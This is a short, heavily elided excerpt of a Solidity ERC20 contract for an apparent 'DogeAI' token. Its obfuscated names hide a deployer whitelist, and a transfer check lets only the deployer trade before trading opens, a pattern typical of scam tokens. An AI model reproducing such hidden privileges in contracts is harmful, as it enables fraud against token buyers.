...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        coolHobby.push(_router); coolHobby.push(msgSender_); coolHobby.push(pair);
        for (uint256 q=0; q < 3;) {enterCountry[coolHobby[q]] = true; unchecked{q++;} }
    ...
    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((theTrading || (sender == coolHobby[1])), "ERC20: trading is not yet enabled.");
        assembly { 
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDogeAI(creator, initialSupply);
    }
}
